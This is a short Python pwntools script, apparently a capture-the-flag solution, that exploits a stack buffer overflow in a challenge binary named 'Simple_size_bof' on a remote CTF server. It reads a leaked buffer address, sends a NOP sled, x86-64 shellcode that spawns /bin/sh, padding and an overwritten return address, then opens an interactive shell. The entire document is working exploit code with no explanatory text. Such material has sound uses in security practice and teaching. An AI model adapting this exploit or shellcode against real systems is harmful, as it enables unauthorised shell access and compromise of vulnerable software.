#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
#p = process("./Simple_size_bof")
p = remote("ctf.j0n9hyun.xyz", 3005)

p.recvuntil("buf: ")
buf = int(p.recv(14), 16)
log.info("buf : "+hex(buf))

shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

pay = '\x90'*100
pay += shellcode
pay += '\x90'*(0x6d30-len(pay))
pay += 'A'*0x8
pay += p64(buf)

p.sendlineafter("\n", pay)

p.interactive()
